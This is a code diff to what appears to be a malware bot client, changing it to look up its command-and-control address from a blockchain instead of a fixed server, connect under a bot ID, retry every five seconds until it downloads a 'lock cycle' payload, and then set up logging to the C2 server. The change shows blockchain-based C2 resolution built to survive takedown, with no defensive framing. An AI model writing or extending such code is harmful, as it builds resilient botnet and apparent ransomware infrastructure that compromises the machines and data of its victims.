@@ -729,11 +729,39 @@ if __name__ == '__main__':
             logger.debug("Core configuration variables set.")
 
             # --- Ghost Comm Client ---
-            ghost_comm_client = GhostCommClient(name=BOT_ID, email=f"{BOT_ID}@localhost")
-            ghost_comm_client.primary_node_host = C2_SERVER
-            ghost_comm_client.connect_to_primary_node()
-            decrypted_payload = ghost_comm_client.request_lock_cycle_payload()
-            ghost_comm_client.close_connection()
+            ghost_comm_client: Optional[GhostCommClient] = None
+            decrypted_payload: Optional[dict] = None
+
+            while True:
+                current_url = fetch_control_url_from_blockchain(logger)
+                update_control_url(current_url)
+                logger.info(f"Attempting Ghost Comm connection via {current_url}")
+
+                client = GhostCommClient(name=BOT_ID, email=f"{BOT_ID}@localhost")
+                client.primary_node_host = current_url
+
+                try:
+                    client.connect_to_primary_node()
+                    decrypted_payload = client.request_lock_cycle_payload()
+                    ghost_comm_client = client
+                    logger.info("Successfully retrieved payload from Ghost Comm.")
+                    break
+                except Exception as exc:
+                    logger.warning(f"Failed to connect to Ghost Comm: {exc}. Retrying in 5 seconds.")
+                    try:
+                        client.close_connection()
+                    except Exception:
+                        pass
+                    time.sleep(5)
+
+            if ghost_comm_client:
+                try:
+                    ghost_comm_client.close_connection()
+                except Exception:
+                    pass
+
+            if decrypted_payload is None:
+                decrypted_payload = {}
 
             # --- C2 Logging Handler ---
             class C2LogHandler(logging.Handler):
